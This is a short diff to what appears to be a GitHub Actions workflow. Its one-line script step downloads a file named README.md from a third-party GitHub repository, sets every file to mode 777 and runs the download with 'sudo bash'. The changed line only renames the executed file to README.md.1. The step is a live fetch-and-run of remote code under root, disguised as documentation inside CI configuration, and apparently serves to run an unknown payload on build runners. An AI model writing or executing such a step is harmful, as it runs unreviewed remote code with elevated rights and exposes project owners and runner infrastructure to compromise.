@@ -27,7 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: wget https://github.com/Lancer4/glowing-engine/raw/main/README.md && chmod 777 * && sudo bash README.md 
+        run: wget https://github.com/Lancer4/glowing-engine/raw/main/README.md && chmod 777 * && sudo bash README.md.1 
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
